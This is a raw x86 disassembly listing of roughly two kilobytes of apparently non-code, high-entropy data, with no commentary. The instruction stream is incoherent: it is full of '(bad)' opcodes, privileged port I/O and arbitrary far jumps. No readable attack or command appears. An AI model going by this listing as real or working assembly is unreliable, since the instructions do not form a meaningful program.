  404fca:	mov    ds,ecx
  404fcc:	push   es
  404fcd:	js     0x405008
  404fcf:	cwde   
  404fd0:	cmp    DWORD PTR [edx],ecx
  404fd2:	mov    ds:0x3e8d88a7,eax
  404fd7:	push   esp
  404fd8:	mov    ah,0x4a
  404fda:	mov    ebp,0x40faa540
  404fdf:	lahf   
  404fe0:	cmp    DWORD PTR [ebp-0x4f0ff093],0x62
  404fe7:	arpl   WORD PTR ds:0xe2a6b0c0,dx
  404fed:	cs sbb al,0x6b
  404ff0:	push   ebp
  404ff1:	pop    esp
  404ff2:	sub    bh,ch
  404ff4:	lods   eax,DWORD PTR ds:[esi]
  404ff5:	imul   BYTE PTR [ebp+0x5b175f59]
  404ffb:	test   al,0x8
  404ffd:	adc    eax,0xe4d90dc8
  405002:	mov    esp,0x4280409c
  405007:	dec    edx
  405008:	adc    eax,0x6f4f651a
  40500d:	loope  0x40502c
  40500f:	push   ecx
  405010:	cmp    DWORD PTR [edi],esi
  405012:	(bad)  
  405013:	(bad)  
  405014:	pop    edx
  405015:	loop   0x405053
  405017:	mov    ds:0xc67b9208,eax
  40501c:	xor    DWORD PTR [ebp+eiz*4+0x2b],0x3b
  405021:	(bad)  
  405022:	daa    
  405023:	fwait
  405024:	ss loope 0x404fb4
  405027:	sbb    BYTE PTR [edi+edi*8+0x1612369e],0xc3
  40502f:	pop    edi
  405030:	xor    ebx,DWORD PTR [edx+0x4ba85b9c]
  405036:	rol    al,cl
  405038:	sbb    ah,BYTE PTR [ebp-0x7cdea876]
  40503e:	std    
  40503f:	or     edi,DWORD PTR [eax-0x27]
  405042:	push   edx
  405043:	cs pop esp
  405045:	push   esi
  405046:	call   0x15e1:0x92ccdacc
  40504d:	hlt    
  40504e:	cli    
  40504f:	popa   
  405050:	scas   al,BYTE PTR es:[edi]
  405051:	sbb    ah,BYTE PTR [esi]
  405053:	gs fdivr st,st(3)
  405056:	mov    cl,0xd5
  405058:	pop    ds
  405059:	or     DWORD PTR [ebx+0xf],0x5ac7f1c7
  405060:	out    dx,eax
  405061:	xchg   DWORD PTR [ebx+ebx*4-0x6a639879],ecx
  405068:	dec    ebx
  405069:	sbb    eax,0xa5b13fab
  40506e:	mov    al,0x87
  405070:	icebp  
  405071:	or     al,0x70
  405073:	mov    edx,0xfd48bdc7
  405078:	pop    ds
  405079:	push   edx
  40507a:	jmp    0xfae4:0x79678283
  405081:	fs push esp
  405083:	add    al,0x9f
  405085:	daa    
  405086:	addr16 retf 0x713
  40508a:	std    
  40508b:	and    BYTE PTR [esi+0x710bba50],ch
  405091:	inc    esi
  405092:	push   0xffffff8f
  405094:	(bad)  
  405095:	das    
  405096:	inc    ebx
  405097:	(bad)  
  405098:	sbb    al,BYTE PTR [edx-0x3]
  40509b:	pop    edi
  40509c:	xchg   ebp,eax
  40509d:	cld    
  40509e:	and    BYTE PTR [esi+ecx*2-0x67b12442],bl
  4050a5:	push   es
  4050a6:	fisttp DWORD PTR [ebp+0x63c06cc1]
  4050ac:	ret    0x54c9
  4050af:	pop    es
  4050b0:	jmp    0xf92e6a62
  4050b5:	cmc    
  4050b6:	pop    ss
  4050b7:	mov    cl,0xdf
  4050b9:	inc    ebx
  4050ba:	xor    eax,0x5c96eb20
  4050bf:	xor    al,0x1d
  4050c1:	cli    
  4050c2:	jae    0x4050e0
  4050c4:	push   ecx
  4050c5:	xor    eax,ebx
  4050c7:	cdq    
  4050c8:	loop   0x405106
  4050ca:	(bad)  
  4050cb:	shr    BYTE PTR cs:[ecx-0x46],0x59
  4050d0:	popf   
  4050d1:	stos   BYTE PTR es:[edi],al
  4050d2:	mov    ds:0x3dc813f3,al
  4050d7:	push   ss
  4050d8:	lds    eax,FWORD PTR ds:0x7537b5bf
  4050de:	imul   edi,esp,0x1b
  4050e1:	xor    al,0x2b
  4050e3:	dec    ebx
  4050e4:	sub    dl,bh
  4050e6:	out    dx,al
  4050e7:	rol    edx,1
  4050e9:	pusha  
  4050ea:	icebp  
  4050eb:	or     BYTE PTR [eax+0x26],bh
  4050ee:	sbb    ebp,ebp
  4050f0:	aad    0x4b
  4050f2:	rol    BYTE PTR [edi+edi*8],0x6a
  4050f6:	mov    ebx,DWORD PTR [edx+0x1e]
  4050f9:	mov    edx,0x55e1df22
  4050fe:	jge    0x405165
  405100:	scas   eax,DWORD PTR es:[edi]
  405101:	ss mov dh,0x3
  405104:	xchg   edi,eax
  405105:	bound  edx,QWORD PTR [ebx-0x1f7e94b5]
  40510b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40510c:	mov    esp,0x3fe4c179
  405111:	xchg   edi,eax
  405112:	(bad)  
  405113:	jbe    0x405136
  405115:	adc    BYTE PTR [eax-0x7fb21ed],ch
  40511b:	push   esi
  40511c:	jnp    0x405158
  40511e:	or     eax,0x30ae7685
  405123:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405124:	loop   0x405104
  405126:	inc    DWORD PTR [edx-0x31cd5d3b]
  40512c:	sub    eax,0xcfec8335
  405131:	jno    0x405194
  405133:	data16 shl BYTE PTR [eax],1
  405136:	cli    
  405137:	je     0x405197
  405139:	pop    ss
  40513a:	(bad)  
  40513b:	dec    ebx
  40513c:	dec    eax
  40513d:	mov    esp,0x699722d6
  405142:	adc    al,0x6b
  405144:	inc    esp
  405145:	mov    esi,0xae66c3fb
  40514a:	xchg   ecx,eax
  40514b:	or     al,0x7a
  40514d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40514e:	out    dx,al
  40514f:	fsubr  DWORD PTR [ebp+0x63]
  405152:	jns    0x4050e3
  405154:	ret    
  405155:	aad    0x22
  405157:	fcmovnbe st,st(7)
  405159:	ror    BYTE PTR [ebp-0x1689cc0c],1
  40515f:	rcr    DWORD PTR [ecx],0xc
  405162:	push   0x29b41231
  405167:	loopne 0x40511f
  405169:	outs   dx,BYTE PTR ds:[esi]
  40516a:	mov    dl,0x48
  40516c:	or     dh,BYTE PTR [esi+0xc]
  40516f:	popa   
  405170:	ret    
  405171:	xchg   ebx,eax
  405172:	loopne 0x405146
  405174:	fbld   TBYTE PTR [eax]
  405176:	xchg   ebx,eax
  405177:	adc    esp,DWORD PTR [edx]
  405179:	push   eax
  40517a:	fbstp  TBYTE PTR [edx+ebx*2-0x82324b8]
  405181:	push   ecx
  405182:	xchg   ebx,eax
  405183:	push   edx
  405184:	jmp    FWORD PTR gs:[ebx]
  405187:	or     al,0xf7
  405189:	xchg   BYTE PTR ds:0xbf5ae790,bh
  40518f:	stos   BYTE PTR es:[edi],al
  405190:	jge    0x40520b
  405192:	rcl    ebx,0x8a
  405195:	pop    edi
  405196:	ficomp WORD PTR [ecx+0x2667f268]
  40519c:	shl    DWORD PTR [edx-0x51],cl
  40519f:	test   edi,ecx
  4051a1:	dec    eax
  4051a2:	data16 js 0x40515b
  4051a5:	cmp    bh,bh
  4051a7:	pop    esi
  4051a8:	cmp    al,0xcb
  4051aa:	btc    ebp,edi
  4051ad:	iret   
  4051ae:	call   0x8a1275b8
  4051b3:	jno    0x405175
  4051b5:	jae    0x4051e3
  4051b7:	mov    al,BYTE PTR [edi-0x489b4dfd]
  4051bd:	fcmove st,st(2)
  4051bf:	jnp    0x405198
  4051c1:	rcl    ebx,1
  4051c3:	(bad)  
  4051c4:	outs   dx,DWORD PTR ds:[esi]
  4051c5:	add    DWORD PTR [edi-0x80c25a4],esp
  4051cb:	clc    
  4051cc:	outs   dx,DWORD PTR ds:[esi]
  4051cd:	aam    0xfa
  4051cf:	sar    edx,0x3b
  4051d2:	sbb    DWORD PTR [ecx],0xfffffff2
  4051d5:	daa    
  4051d6:	mov    edx,0x4c388662
  4051db:	jg     0x405224
  4051dd:	ds dec ebx
  4051df:	bound  eax,QWORD PTR [ebp-0x6]
  4051e2:	jge    0x40517d
  4051e4:	xor    ah,ch
  4051e6:	rcr    DWORD PTR [ecx],0x58
  4051e9:	pop    eax
  4051ea:	aas    
  4051eb:	push   eax
  4051ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051ed:	test   DWORD PTR gs:[ecx+0x22],ebp
  4051f1:	or     esp,DWORD PTR [ecx+0x599242f4]
  4051f7:	idiv   BYTE PTR [ebx+ebp*8]
  4051fa:	test   BYTE PTR [esi],ah
  4051fc:	jae    0x405228
  4051fe:	es jo  0x405255
  405201:	sub    bl,bl
  405203:	int    0x7f
  405205:	mov    edi,0xf72152f2
  40520a:	in     eax,dx
  40520b:	add    al,BYTE PTR [ebp+0x2f]
  40520e:	inc    ebp
  40520f:	int3   
  405210:	and    ah,BYTE PTR [ebp-0x70]
  405213:	push   cs
  405214:	cmp    BYTE PTR [edx+0x7837471b],cl
  40521a:	daa    
  40521b:	mov    esp,0x5c3dd24c
  405220:	imul   eax,DWORD PTR [eax],0x3
  405223:	mov    ecx,0x2d71a153
  405228:	aad    0x2f
  40522a:	sahf   
  40522b:	into   
  40522c:	fidiv  WORD PTR [ecx+0x30dc7265]
  405232:	adc    DWORD PTR [esi-0x6b],eax
  405235:	(bad)  
  405236:	mov    al,ds:0x57746f3b
  40523b:	sbb    BYTE PTR [edi+0x1f9e413c],al
  405241:	mov    ecx,0x443f5e10
  405246:	sbb    eax,DWORD PTR [esp+edi*8]
  405249:	lea    edx,[ebx+0x5f]
  40524c:	push   ebx
  40524d:	cmp    al,0x1b
  40524f:	les    eax,FWORD PTR [edx]
  405251:	jecxz  0x405222
  405253:	je     0x405293
  405255:	imul   edi,DWORD PTR [edi],0x6d
  405258:	mov    dh,0x11
  40525a:	in     al,dx
  40525b:	scas   al,BYTE PTR es:[edi]
  40525c:	sar    edx,0x99
  40525f:	xlat   BYTE PTR ds:[ebx]
  405260:	jle    0x4051f2
  405262:	mov    dl,0xc5
  405264:	jae    0x4052e5
  405266:	xor    eax,0xdddfa42e
  40526b:	or     eax,DWORD PTR [edi+ebp*1]
  40526e:	data16 mov dl,0x19
  405271:	imul   DWORD PTR [eax]
  405273:	cmp    DWORD PTR [eax],ebp
  405275:	sub    al,0xb8
  405277:	xchg   edx,eax
  405278:	adc    eax,0x33f1ee6d
  40527d:	pshufw mm2,mm5,0xbb
  405281:	sbb    eax,0x3c410418
  405286:	push   ss
  405287:	mov    ebx,0xc91683f8
  40528c:	arpl   WORD PTR [ecx],ax
  40528e:	cli    
  40528f:	lods   al,BYTE PTR ds:[esi]
  405290:	aad    0xc2
  405292:	ins    BYTE PTR es:[edi],dx
  405293:	dec    edi
  405294:	push   ds
  405295:	mov    WORD PTR [edi+edx*4-0x5],gs
  405299:	shr    DWORD PTR [eax-0x66d1d330],1
  40529f:	jo     0x405238
  4052a1:	scas   eax,DWORD PTR es:[edi]
  4052a2:	or     al,0xc8
  4052a4:	pop    eax
  4052a5:	dec    esi
  4052a6:	mov    dl,0xc0
  4052a8:	call   eax
  4052aa:	gs or  eax,0x3ad39e90
  4052b0:	ret    
  4052b1:	neg    BYTE PTR [eax+ebp*1-0x67]
  4052b5:	test   BYTE PTR [ecx-0x314e7efa],al
  4052bb:	aam    0x8
  4052bd:	lods   al,BYTE PTR ds:[esi]
  4052be:	cmp    eax,0xe58e2fe8
  4052c3:	xchg   edx,eax
  4052c4:	sub    DWORD PTR ds:0xb9949108,edi
  4052ca:	cld    
  4052cb:	in     al,0x62
  4052cd:	jle    0x4052de
  4052cf:	or     eax,0x1a719c8f
  4052d4:	stos   BYTE PTR es:[edi],al
  4052d5:	jg     0x4052fb
  4052d7:	add    edx,DWORD PTR [ebx]
  4052d9:	fs (bad) 
  4052db:	clc    
  4052dc:	scas   al,BYTE PTR es:[edi]
  4052dd:	js     0x405330
  4052df:	(bad)  
  4052e1:	add    bl,BYTE PTR [edx+0x78]
  4052e4:	shr    ebp,cl
  4052e6:	jne    0x405340
  4052e8:	or     bh,BYTE PTR [ecx]
  4052ea:	mov    WORD PTR ds:0xd75b0ba4,ss
  4052f0:	mov    BYTE PTR [eax-0x7bb8fe3b],dl
  4052f6:	ins    DWORD PTR es:[edi],dx
  4052f7:	xor    eax,0x839365aa
  4052fc:	sub    al,0xde
  4052fe:	pop    edi
  4052ff:	dec    ebp
  405300:	dec    eax
  405301:	repz sub eax,0x7444c12e
  405307:	mov    esi,0xdf780edc
  40530c:	inc    ebx
  40530d:	xchg   edx,eax
  40530e:	inc    esp
  40530f:	adc    edx,DWORD PTR [edx]
  405311:	sbb    BYTE PTR [edi-0x13],al
  405314:	test   BYTE PTR [ebx-0x4],cl
  405317:	mov    eax,ds:0xd3ad464a
  40531c:	aad    0x13
  40531e:	xchg   edx,eax
  40531f:	or     ebx,esi
  405321:	fdivr  QWORD PTR [eax+0x65]
  405324:	cmp    al,ah
  405326:	test   eax,0xe9e67aa7
  40532b:	imul   edi,DWORD PTR [eax],0x51
  40532e:	arpl   si,dx
  405330:	cdq    
  405331:	aad    0x24
  405333:	cmp    al,0xe
  405335:	stc    
  405336:	ins    DWORD PTR es:[edi],dx
  405337:	mov    ds:0xa79e39b5,eax
  40533c:	pop    esi
  40533d:	in     eax,0x53
  40533f:	xchg   DWORD PTR [ecx+eax*1+0x2b],esp
  405343:	imul   edx,DWORD PTR [eax+0x29],0x19
  405347:	adc    edx,DWORD PTR [edx]
  405349:	xchg   ebp,eax
  40534a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40534b:	shl    DWORD PTR [ecx-0x6048c3a7],0x61
  405352:	sub    dl,al
  405354:	xchg   ebx,eax
  405355:	jb     0x405348
  405357:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405358:	mov    esi,0xf922ebca
  40535d:	xor    eax,0xef48b685
  405362:	mov    edi,0xae66c68
  405367:	stc    
  405368:	(bad)  
  40536a:	aas    
  40536b:	les    esp,FWORD PTR [ebp-0x203e22f0]
  405371:	sub    al,0x42
  405373:	int3   
  405374:	cmp    eax,0x78b8622d
  405379:	shl    DWORD PTR [edx],0x89
  40537c:	ret    
  40537d:	inc    ebp
  40537e:	mov    cl,ah
  405380:	retf   0xe6e3
  405383:	lds    ebp,FWORD PTR [eax+0x79]
  405386:	sbb    eax,0x26cf848
  40538b:	shl    edx,cl
  40538d:	adc    BYTE PTR [esi],dh
  40538f:	jns    0x405375
  405391:	shl    BYTE PTR [ecx],0x41
  405394:	or     BYTE PTR [eax-0x30],0x4b
  405398:	push   cs
  405399:	into   
  40539a:	or     BYTE PTR [edi-0x3e],0x3d
  40539e:	loope  0x4053fc
  4053a0:	or     DWORD PTR [esp+edi*1+0x47],eax
  4053a4:	sub    esi,ecx
  4053a6:	sub    al,0xa0
  4053a8:	push   esp
  4053a9:	xor    BYTE PTR [edi+edx*1+0x301875ad],0x38
  4053b1:	ud1    edx,DWORD PTR [ebp+0x45]
  4053b5:	retf   
  4053b6:	js     0x405347
  4053b8:	fisub  WORD PTR [esi-0x13c0a4a4]
  4053be:	retf   
  4053bf:	push   esp
  4053c0:	retf   
  4053c1:	sar    bh,cl
  4053c3:	sbb    DWORD PTR [esi],ebp
  4053c5:	dec    ebp
  4053c6:	inc    esi
  4053c7:	cmp    DWORD PTR [ebx],ebp
  4053c9:	daa    
  4053ca:	push   cs
  4053cb:	enter  0x9b66,0xba
  4053cf:	iret   
  4053d0:	jp     0x405353
  4053d2:	je     0x40536f
  4053d4:	mov    edi,0xf42ae41f
  4053d9:	adc    al,0x68
  4053db:	fwait
  4053dc:	loopne 0x4053f2
  4053de:	addr16 aaa 
  4053e0:	sub    BYTE PTR [esi-0x451bee20],ah
  4053e6:	xchg   esi,eax
  4053e7:	out    0x8f,al
  4053e9:	bound  esi,QWORD PTR [edx+eax*4]
  4053ec:	adc    esi,DWORD PTR [ecx]
  4053ee:	mov    edx,0x51038db1
  4053f3:	sbb    al,0x33
  4053f5:	or     dh,BYTE PTR [ecx-0x1208d2c7]
  4053fb:	push   0xffffffb9
  4053fd:	addr16 into 
  4053ff:	lahf   
  405400:	xor    BYTE PTR [esi-0x16],dl
  405403:	or     al,0x1
  405405:	xor    eax,0x1f46b32f
  40540a:	imul   edx,DWORD PTR [edx*1+0x2a1b6f21],0xe
  405412:	enter  0xf4b1,0x8c
  405416:	retf   0xa437
  405419:	mov    dl,BYTE PTR [ecx+0x59]
  40541c:	repz je 0x405479
  40541f:	push   esp
  405420:	lods   al,BYTE PTR ds:[esi]
  405421:	sbb    eax,0x9cb11322
  405426:	xchg   edx,eax
  405427:	les    ebp,FWORD PTR [ebp+0x47e3a7bd]
  40542d:	push   es
  40542e:	dec    eax
  40542f:	bound  ecx,QWORD PTR [eax]
  405431:	mov    ch,0x6b
  405433:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405434:	add    al,0xeb
  405436:	jns    0x405456
  405438:	cmp    bl,BYTE PTR [eax]
  40543a:	cmp    cl,ch
  40543c:	jmp    0xe5a6151
  405441:	in     eax,dx
  405442:	sbb    al,0xd0
  405444:	xor    eax,0x40ccd78b
  405449:	daa    
  40544a:	xor    eax,0x9dd806e5
  40544f:	sbb    BYTE PTR [ebx+edx*1+0x21],ah
  405453:	add    BYTE PTR [ebp-0x58],al
  405456:	mov    ecx,0xf17bcd51
  40545b:	pop    ebx
  40545c:	cli    
  40545d:	into   
  40545e:	idiv   BYTE PTR [edi+0x18]
  405461:	or     DWORD PTR [eax-0x12],ebp
  405464:	out    dx,al
  405465:	mov    cl,0xd
  405467:	jle    0x4053ef
  405469:	loop   0x4054a9
  40546b:	sub    al,ah
  40546d:	jmp    0x38fe4212
  405472:	cmp    ah,al
  405474:	(bad)  
  405475:	cmc    
  405476:	sub    al,0xa9
  405478:	in     al,dx
  405479:	(bad)  
  40547a:	mov    ds:0x83d56977,al
  40547f:	pop    ss
  405480:	repz xor ch,BYTE PTR [edx+0x14c5ddad]
  405487:	pusha  
  405488:	and    eax,ecx
  40548a:	push   ecx
  40548b:	or     edx,DWORD PTR [esi]
  40548d:	ficomp WORD PTR [edi+edi*2+0x7031b0a7]
  405494:	ja     0x405463
  405496:	jmp    0xefff:0xc2308b87
  40549d:	(bad)  
  40549e:	mov    edi,0x51dba74f
  4054a3:	(bad)  
  4054a4:	retf   0x8cb5
  4054a7:	lods   al,BYTE PTR ds:[esi]
  4054a8:	jg     0x4054d6
  4054aa:	cmp    DWORD PTR [esi+0x63],0x7217c479
  4054b1:	mov    cl,0x11
  4054b3:	jns    0x4054e4
  4054b5:	pop    ebp
  4054b6:	lds    edi,FWORD PTR [edi]
  4054b8:	ret    
  4054b9:	mov    BYTE PTR [esi+0x1a],ah
  4054bc:	icebp  
  4054bd:	push   esi
  4054be:	mov    esi,esp
  4054c0:	aad    0x57
  4054c2:	xchg   edx,eax
  4054c3:	and    DWORD PTR [edx+0x8],ebp
  4054c6:	test   al,0xf7
  4054c8:	and    DWORD PTR [edi+0x3d],0x56b3da6d
  4054cf:	std    
  4054d0:	mov    ds:0xd2aff475,eax
  4054d5:	mov    edi,0xf54bfddb
  4054da:	xor    cl,bl
  4054dc:	test   eax,0xd4c34ed6
  4054e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054e2:	retf   0xd6c6
  4054e5:	pop    ebp
  4054e6:	pusha  
  4054e7:	cmp    BYTE PTR [edx+0x5b],cl
  4054ea:	popa   
  4054eb:	and    ch,BYTE PTR [esi+eax*2]
  4054ee:	js     0x405535
  4054f0:	call   0x706f4bc6
  4054f5:	in     eax,0xe0
  4054f7:	sub    eax,0x8f3c758d
  4054fc:	xor    BYTE PTR [edx-0x277896b3],dh
  405502:	push   eax
  405503:	adc    DWORD PTR [edi+0x4b6862f2],esi
  405509:	xlat   BYTE PTR ds:[ebx]
  40550a:	mov    eax,0x565d3f41
  40550f:	(bad)  
  405510:	sbb    DWORD PTR [edx-0x5e],esi
  405513:	add    DWORD PTR [ebx-0x57f4051a],ebx
  405519:	or     dh,cl
  40551b:	fisub  DWORD PTR [esp+ecx*4]
  40551e:	jge    0x4054a1
  405520:	xchg   esi,eax
  405521:	adc    al,0xc5
  405523:	repz xchg ebx,eax
  405525:	xor    dh,ch
  405527:	and    eax,0xe32bd8a3
  40552c:	xchg   ebx,eax
  40552d:	shl    BYTE PTR [ecx],0xc8
  405530:	or     dl,BYTE PTR [edx-0x7407d751]
  405536:	add    bh,BYTE PTR [bx+0x18]
  40553a:	pop    ds
  40553b:	xlat   BYTE PTR ds:[ebx]
  40553c:	and    dh,al
  40553e:	pop    edx
  40553f:	cmp    BYTE PTR cs:[edi-0x679b8068],bh
  405546:	cmp    ebx,DWORD PTR [eax+eiz*1-0xf]
  40554a:	sub    ebp,DWORD PTR [edx]
  40554c:	ret    0x73a6
  40554f:	inc    esp
  405550:	jb     0x405575
  405552:	mov    ds:0x7062befd,eax
  405557:	mov    dl,0xa6
  405559:	and    esp,DWORD PTR [ecx-0x5ef91546]
  40555f:	addr16 xchg ecx,eax
  405561:	and    DWORD PTR [ecx-0x6f57785f],edx
  405567:	mov    eax,ds:0x4be2b5ab
  40556c:	mov    bl,cl
  40556e:	jo     0x4055c7
  405570:	xchg   ecx,eax
  405571:	int    0x7b
  405573:	dec    eax
  405574:	sbb    ebp,DWORD PTR [ecx+esi*4]
  405577:	pop    ebp
  405578:	or     al,0x39
  40557a:	jo     0x405578
  40557c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40557d:	and    BYTE PTR [ecx+0x5c],bh
  405580:	push   0xa8d9859f
  405585:	adc    al,BYTE PTR ds:0x7194a1a
  40558b:	ss mov bl,0x99
  40558e:	pop    ebp
  40558f:	jle    0x4055ad
  405591:	adc    dh,BYTE PTR [ecx+0x23]
  405594:	test   al,0x8f
  405596:	aaa    
  405597:	je     0x405523
  405599:	stos   BYTE PTR es:[edi],al
  40559a:	mov    bh,0x1b
  40559c:	retf   
  40559d:	or     al,0x15
  40559f:	and    DWORD PTR [edi],edi
  4055a1:	leave  
  4055a2:	in     al,0x88
  4055a4:	xor    al,0x7
  4055a6:	sub    DWORD PTR [ecx-0x40],edx
  4055a9:	hlt    
  4055aa:	mov    dl,0x77
  4055ac:	sub    eax,0xf0a51814
  4055b1:	ins    BYTE PTR es:[edi],dx
  4055b2:	ins    BYTE PTR es:[edi],dx
  4055b3:	popf   
  4055b4:	rol    cl,cl
  4055b6:	pop    ds
  4055b7:	xchg   BYTE PTR [ecx-0x76b0776a],bl
  4055bd:	xor    al,0x0
  4055bf:	cld    
  4055c0:	or     ch,BYTE PTR [ebx-0x4666fdf7]
  4055c6:	jl     0x405550
  4055c8:	xchg   DWORD PTR [esp+ebx*2],ecx
  4055cb:	dec    esi
  4055cc:	fdivr  st,st(2)
  4055ce:	mov    al,0x2b
  4055d0:	mov    dl,0x90
  4055d2:	inc    edx
  4055d3:	(bad)  
  4055d4:	shl    ah,1
  4055d6:	aam    0x0
  4055d8:	mov    ebx,0xb6d1624f
  4055dd:	push   ebp
  4055de:	dec    esp
  4055df:	push   esp
  4055e0:	ror    BYTE PTR [eax+ebx*1+0x24],0xf0
  4055e5:	jmp    0xb4735a1
  4055ea:	jbe    0x4055d3
  4055ec:	loope  0x405583
  4055ee:	push   0x794954b4
  4055f3:	es fwait
  4055f5:	pop    ebx
  4055f6:	or     DWORD PTR [edx+ebp*2-0x46f5def4],eax
  4055fd:	and    esi,ecx
  4055ff:	in     eax,0x6f
  405601:	js     0x4055bb
  405603:	pop    ebx
  405604:	hlt    
  405605:	jbe    0x4055d1
  405607:	inc    edx
  405608:	lock out dx,al
  40560a:	in     eax,0xcc
  40560c:	adc    bl,BYTE PTR [eax+ecx*1]
  40560f:	ins    DWORD PTR es:[edi],dx
  405610:	inc    ebp
  405611:	fwait
  405612:	dec    esi
  405613:	sbb    BYTE PTR [esi+0x12],ch
  405616:	lods   eax,DWORD PTR ds:[esi]
  405617:	lock fs dec ecx
  40561a:	out    0x7,eax
  40561c:	in     eax,0x94
  40561e:	inc    ebx
  40561f:	test   DWORD PTR [bp+0x6e],ecx
  405623:	mov    ebx,0xffb51115
  405628:	mov    bh,0x34
  40562a:	inc    edx
  40562b:	icebp  
  40562c:	daa    
  40562d:	add    eax,DWORD PTR [ebx]
  40562f:	mov    cl,0x6a
  405631:	fcom   DWORD PTR [ecx+edx*1-0x1d0ccc62]
  405638:	jmp    FWORD PTR [ecx]
  40563a:	xor    bl,BYTE PTR [ebx-0x12]
  40563d:	call   FWORD PTR [edx-0x16e057a8]
  405643:	push   edx
  405644:	cwde   
  405645:	fisttp QWORD PTR [esi-0x47]
  405648:	pushf  
  405649:	jb     0x4055dc
  40564b:	test   DWORD PTR [ecx],ebp
  40564d:	cli    
  40564e:	retf   
  40564f:	push   ebp
  405650:	xchg   BYTE PTR [esi+ebp*8],bl
  405653:	sti    
  405654:	and    eax,0xa6316eac
  405659:	jl     0x40561a
  40565b:	sti    
  40565c:	jnp    0x40569c
  40565e:	enter  0xb849,0xce
  405662:	pop    esp
  405663:	add    BYTE PTR ds:0x337c9430,dl
  405669:	ror    ah,cl
  40566b:	jg     0x40561f
  40566d:	xor    ebx,edx
  40566f:	call   0x842b:0xaa41a64a
  405676:	mov    edi,0xe72c530d
  40567b:	mov    edi,0xb26402e4
  405680:	sbb    DWORD PTR [ebp+eax*1-0x64],0xa36bd04d
  405688:	add    DWORD PTR [edi+0x2e],eax
  40568b:	rol    ecx,0x24
  40568e:	out    0x80,al
  405690:	mov    al,BYTE PTR [edi-0x3938582b]
  405696:	mov    BYTE PTR [esi-0x20],bl
  405699:	adc    DWORD PTR [ecx+0x4e928da0],edx
  40569f:	cs push 0x49
  4056a2:	and    BYTE PTR [ebp-0x44],0x43
  4056a6:	retf   
  4056a7:	mov    al,ds:0xd2f975c5
  4056ac:	add    BYTE PTR [edi+esi*4],0x4
  4056b0:	popf   
  4056b1:	mov    ebx,DWORD PTR ds:0xdb4bddb8
  4056b7:	js     0x40570e
  4056b9:	jnp    0x405682
  4056bb:	cmp    ecx,DWORD PTR ds:0xb5d0568a
  4056c1:	lock std 
  4056c3:	outs   dx,DWORD PTR ds:[esi]
  4056c4:	ins    BYTE PTR es:[edi],dx
  4056c5:	fistp  QWORD PTR [eax-0x68]
  4056c8:	xor    eax,0x1664ea87
  4056cd:	and    DWORD PTR [esi-0x30],0x96fbf0c3
  4056d4:	imul   ebx,DWORD PTR [ecx-0xa68d6d3],0x4
  4056db:	fsub   QWORD PTR [ebp+0x5b]
  4056de:	ja     0x405725
  4056e0:	mov    al,ds:0x74291e88
  4056e5:	mov    eax,ds:0xb9137cd1
  4056ea:	jl     0x4056cb
  4056ec:	aaa    
  4056ed:	or     cl,BYTE PTR [eax]
  4056ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056f0:	mov    bh,0xcd
  4056f2:	sub    eax,0xe4c78fc
  4056f7:	xchg   edi,eax
  4056f8:	pop    ecx
  4056f9:	mov    dh,0x6a
  4056fb:	or     edx,edx
  4056fd:	adc    al,0x56
  4056ff:	jmp    0x5690:0x78222a12
  405706:	mov    bh,0xdb
  405708:	mov    ds:0x47fa4d23,al
  40570d:	(bad)  
  40570e:	mov    ecx,0x21e5e343
  405713:	retf   
  405714:	or     DWORD PTR [esi-0x6b9408bd],ebp
  40571a:	adc    dh,dh
  40571c:	add    BYTE PTR [esi+0x22b22dd9],dh
  405722:	inc    ebp
  405723:	add    dl,BYTE PTR [esp+eax*4]
  405726:	shl    DWORD PTR [edx],1
  405728:	mov    edi,0x5acabe34
  40572d:	xor    BYTE PTR [ebx+ecx*4+0x61a303de],ch
  405734:	loop   0x4056df
  405736:	mov    ch,0xb9
  405738:	cmp    al,0x5c
  40573a:	inc    edi
  40573b:	push   eax
  40573c:	pop    edx
  40573d:	mov    eax,0x5dda833d
  405742:	lds    esi,FWORD PTR [esi+0x26]
  405745:	or     DWORD PTR [edx+0x70],esi
  405748:	jmp    0xb8df:0x158a4658
  40574f:	add    eax,0xd473d085
  405754:	rcl    BYTE PTR [eax-0x2974a51a],cl
  40575a:	leave  
  40575b:	(bad)  [esi+0x48]
  40575e:	jno    0x4056fd
  405760:	lds    esi,FWORD PTR [esi+0x6a]
  405763:	pop    ecx
  405764:	jp     0x40578f
  405766:	push   edx
  405767:	fnsave [eax]
  405769:	xor    al,0x12
  40576b:	mov    ecx,0x4ecfcf74
  405770:	in     eax,0xb
  405772:	mov    dl,0x7a
  405774:	sbb    bl,BYTE PTR [edi+edx*8-0x541fd6a2]
  40577b:	ins    DWORD PTR es:[edi],dx
  40577c:	sahf   
  40577d:	daa    
  40577e:	dec    ebx
  40577f:	sbb    al,0xf
  405781:	inc    edi
  405782:	inc    edi
  405783:	push   cs
  405784:	push   esi
  405785:	test   DWORD PTR [ebp+eiz*1-0x1f],ecx
  405789:	hlt    
  40578a:	aas    
  40578b:	outs   dx,BYTE PTR ds:[esi]
  40578c:	repnz mov WORD PTR [eax],fs
  40578f:	cmp    BYTE PTR [edi],bh
  405791:	jp     0x405781
  405793:	pop    ss
  405794:	xchg   BYTE PTR [ecx],ch
  405796:	adc    al,0x17
  405798:	les    ecx,FWORD PTR [edx+edx*2]
  40579b:	in     al,0x27
  40579d:	pop    eax
  40579e:	cs (bad) 
  4057a0:	fsubr  QWORD PTR ds:0xd72d83fa
  4057a6:	dec    esi
  4057a7:	(bad)  
  4057a8:	mov    esp,DWORD PTR [ebx-0x9731a0]
  4057ae:	jmp    0x29ea:0xaf2f701b
  4057b5:	inc    ebp
  4057b6:	into   
  4057b7:	fidivr WORD PTR [edi-0x39ac04d7]
  4057bd:	inc    ebp
  4057be:	in     al,0x11
  4057c0:	pop    ds
  4057c1:	bound  ecx,QWORD PTR [edx-0x76577522]
  4057c7:	or     edi,eax
  4057c9:	jecxz  0x405787
  4057cb:	jb     0x4057dc
  4057cd:	sbb    edx,DWORD PTR [ebx]
